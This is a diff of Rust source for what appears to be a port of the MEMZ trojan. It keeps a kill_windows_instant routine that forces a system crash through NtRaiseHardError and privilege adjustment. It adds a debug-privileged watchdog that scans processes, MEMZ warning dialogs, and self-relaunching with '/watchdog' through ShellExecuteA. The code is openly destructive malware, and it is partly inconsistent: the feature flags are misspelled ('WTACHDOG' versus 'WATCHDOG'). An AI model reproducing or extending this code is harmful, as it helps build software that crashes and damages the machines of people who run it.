@@ -1,11 +1,11 @@
+#![allow(unused_imports)]
 #![allow(dead_code)]
-use ::log::error;
-#[cfg(feature = "DEBUG")]
-use ::log::info;
+#[cfg(all(feature = "DEBUG_MODE", feature = "WTACHDOG"))]
+use ::log::{error, info};
 
 use memz_rs::{
     convert_str::ToPCSTRWrapper,
-    data::data::MSGS,
+    data::data::{MEMZ_MSGBOXA_1, MEMZ_MSGBOXA_2, MSGS},
     ntdll::{
         library::Library,
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
@@ -18,6 +18,7 @@ use memz_rs::{
 use rand::Rng;
 use std::{
     mem::size_of,
+    process,
     thread::{self, sleep},
     time::Duration,
 };
@@ -33,10 +34,13 @@ use windows::{
             Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
             Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
         },
-        UI::WindowsAndMessaging::{
-            CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW,
-            CS_VREDRAW, HCURSOR, HICON, HMENU, MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, MSG, WH_CBT,
-            WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
+        UI::{
+            Shell::ShellExecuteA,
+            WindowsAndMessaging::{
+                CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW, CS_VREDRAW,
+                HCURSOR, HICON, HMENU, IDYES, MB_ICONHAND, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL,
+                MB_YESNO, MSG, SW_SHOWDEFAULT, WH_CBT, WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
+            },
         },
     },
 };
@@ -47,9 +51,9 @@ struct Clean {
     dialog: HWND,
 }
 
-fn kill_windows() -> Result<(), ()> {
+fn kill_windows() -> Result<(), WinError> {
     for _ in 0..20 {
-        let rip_message_thread = thread::spawn(move || -> Result<(), ()> {
+        let rip_message_thread = thread::spawn(move || -> Result<(), WinError> {
             let hook = wrap_set_windows_hook_ex_a(
                 WH_CBT,
                 Some(msg_box_hook),
@@ -75,7 +79,7 @@ fn kill_windows() -> Result<(), ()> {
     Ok(())
 }
 
-fn kill_windows_instant() -> Result<(), ()> {
+fn kill_windows_instant() -> Result<(), WinError> {
     // Try to force BSOD first
     // I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
     // This isn't even an exploit, it's just an undocumented feature.
@@ -102,73 +106,109 @@ fn kill_windows_instant() -> Result<(), ()> {
     Ok(())
 }
 
-fn main() -> Result<(), ()> {
+fn main() -> Result<(), WinError> {
     log::new_log();
-
     let res = Resolution::new();
-    let watchdog_thread = thread::spawn(watchdog_thread);
-    watchdog_thread.join().unwrap().unwrap();
+    #[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
+    {
+        let watchdog_thread = thread::spawn(watchdog_thread);
+        watchdog_thread.join().unwrap().unwrap();
 
-    let c: WNDCLASSEXA = WNDCLASSEXA {
-        cbSize: size_of::<WNDCLASSEXA>() as u32,
-        style: CS_HREDRAW | CS_VREDRAW,
-        lpfnWndProc: Some(window_proc),
-        cbClsExtra: 0,
-        cbWndExtra: 0,
-        hInstance: HMODULE(0),
-        hIcon: HICON(0),
-        hCursor: HCURSOR(0),
-        hbrBackground: HBRUSH(0),
-        lpszMenuName: PCSTR::null(),
-        lpszClassName: *"hax".to_pcstr(),
-        hIconSm: HICON(0),
-    };
-
-    wrap_register_class_ex_a(&c)?;
-
-    let hwnd = unsafe {
-        CreateWindowExA(
-            WINDOW_EX_STYLE(0),
-            *"hax".to_pcstr(),
-            PCSTR::null(),
-            WINDOW_STYLE(0),
-            0,
-            0,
-            100,
-            100,
-            HWND(0),
-            HMENU(0),
-            HMODULE(0),
-            None,
-        )
-    };
-
-    if hwnd.0 == 0 {
-        panic!("CreateWindowExA is NULL")
-    }
-
-    let mut msg: MSG = Default::default();
-    while wrap_get_message(&mut msg, hwnd, 0, 0)? {
-        unsafe {
-            if !TranslateMessage(&mut msg).as_bool() {
-                return Err(eprintln!(
-                    "Failed TranslateMessage()\nError: message is not translated"
-                ));
-            };
-
-            DispatchMessageA(&mut msg); // return value generally is ignored
+        let c: WNDCLASSEXA = WNDCLASSEXA {
+            cbSize: size_of::<WNDCLASSEXA>() as u32,
+            style: CS_HREDRAW | CS_VREDRAW,
+            lpfnWndProc: Some(window_proc),
+            cbClsExtra: 0,
+            cbWndExtra: 0,
+            hInstance: HMODULE(0),
+            hIcon: HICON(0),
+            hCursor: HCURSOR(0),
+            hbrBackground: HBRUSH(0),
+            lpszMenuName: PCSTR::null(),
+            lpszClassName: *"hax".to_pcstr(),
+            hIconSm: HICON(0),
         };
+
+        wrap_register_class_ex_a(&c)?;
+
+        let hwnd = unsafe {
+            CreateWindowExA(
+                WINDOW_EX_STYLE(0),
+                *"hax".to_pcstr(),
+                PCSTR::null(),
+                WINDOW_STYLE(0),
+                0,
+                0,
+                100,
+                100,
+                HWND(0),
+                HMENU(0),
+                HMODULE(0),
+                None,
+            )
+        };
+
+        if hwnd.0 == 0 {
+            panic!("CreateWindowExA is NULL")
+        }
+
+        let mut msg: MSG = Default::default();
+        while wrap_get_message(&mut msg, hwnd, 0, 0)? {
+            unsafe {
+                if !TranslateMessage(&mut msg).as_bool() {
+                    return Err(eprintln!(
+                        "Failed TranslateMessage()\nError: message is not translated"
+                    ));
+                };
+
+                DispatchMessageA(&mut msg); // return value generally is ignored
+            };
+        }
     }
+
+    #[cfg(not(feature = "DEBUG_MODE"))]
+    {
+        if wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_1, "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
+            || wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_2, "MEMZ", MB_YESNO | MB_ICONWARNING)?
+                != IDYES
+        {
+            process::exit(0);
+        }
+    }
+
+    let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
+    wrap_get_module_file_name(
+        HANDLE::default(),
+        HMODULE(8192 as isize),
+        fn_buf.as_mut_slice(),
+    )?;
+
+    let path = std::str::from_utf8(&fn_buf).unwrap();
+
+    for _ in 0..5 {
+        unsafe {
+            ShellExecuteA(
+                HWND(0),
+                PCSTR::null(),
+                *path.to_pcstr(),
+                *"/watchdog".to_pcstr(),
+                PCSTR::null(),
+                SW_SHOWDEFAULT,
+            );
+        }
+    }
+
+    // todo!()
 
     Ok(())
 }
 
-
+#[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
 fn watchdog_thread() -> Result<(), ()> {
     let mut oproc = 0;
     let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
     wrap_get_process_image_filename_a(&mut f_buf1)?;
-    #[cfg(feature = "DEBUG")]
+    #[cfg(feature = "WATCHDOG")]
     {
         let data = format!("f_buf1: {}", std::str::from_utf8(&f_buf1).unwrap());
         let data = data.replace("\0", "");
@@ -180,13 +220,13 @@ fn watchdog_thread() -> Result<(), ()> {
 
     set_privilege(SE_DEBUG_NAME, true)?;
 
-    #[cfg(feature = "DEBUG")]
+    #[cfg(feature = "WATCHDOG")]
     {
         info!(target: "info_log", "{}", dbg!(set_privilege(SE_DEBUG_NAME, true)?))
     }
     loop {
         let snapshot = wrap_create_toolhelp32_snapshot()?;
-        #[cfg(feature = "DEBUG")]
+        #[cfg(feature = "WATCHDOG")]
         {
             info!(target: "info_log", "{:?}", dbg!(&snapshot));
             sleep(Duration::from_millis(500));
@@ -198,7 +238,7 @@ fn watchdog_thread() -> Result<(), ()> {
 
         unsafe {
             Process32First(snapshot, &mut proc);
-            #[cfg(feature = "DEBUG")]
+            // #[cfg(feature = "DEBUG")]
             {
                 let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                 let file = file.replace("\0", "");
@@ -235,14 +275,14 @@ fn watchdog_thread() -> Result<(), ()> {
                     };
                 }
             }
-            #[cfg(feature = "DEBUG")]
+            #[cfg(feature = "WATCHDOG")]
             {
                 info!(target: "info_log", "{:?}\n", dbg!(&h_proc));
                 sleep(Duration::from_millis(500));
             }
             let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
             wrap_get_process_image_filename_a(&mut f_buf2)?;
-            #[cfg(feature = "DEBUG")]
+            #[cfg(feature = "WATCHDOG")]
             {
                 let data = format!("f_buf2: {}", std::str::from_utf8(&f_buf2).unwrap());
                 let data = data.replace("\0", "");
@@ -252,7 +292,7 @@ fn watchdog_thread() -> Result<(), ()> {
             }
             if f_buf1 != f_buf2 {
                 nproc += 1;
-                #[cfg(feature = "DEBUG")]
+                #[cfg(feature = "WATCHDOG")]
                 {
                     info!(target: "info_log", "{}\n", dbg!(&nproc));
                     sleep(Duration::from_millis(500));
@@ -262,11 +302,11 @@ fn watchdog_thread() -> Result<(), ()> {
             wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
             drop(f_buf2);
 
-            #[cfg(not(feature = "DEBUG"))]
+            #[cfg(not(feature = "WATCHDOG"))]
             if !wrap_process32_next(snapshot, &mut proc) {
                 break;
             }
-            #[cfg(feature = "DEBUG")]
+            #[cfg(feature = "WATCHDOG")]
             if dbg!(!wrap_process32_next(snapshot, &mut proc)) {
                 break;
             }
@@ -276,7 +316,7 @@ fn watchdog_thread() -> Result<(), ()> {
                 panic!("Unable to open system process");
             }
 
-            #[cfg(feature = "DEBUG")]
+            #[cfg(feature = "WATCHDOG")]
             {
                 let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                 let file = file.replace("\0", "");
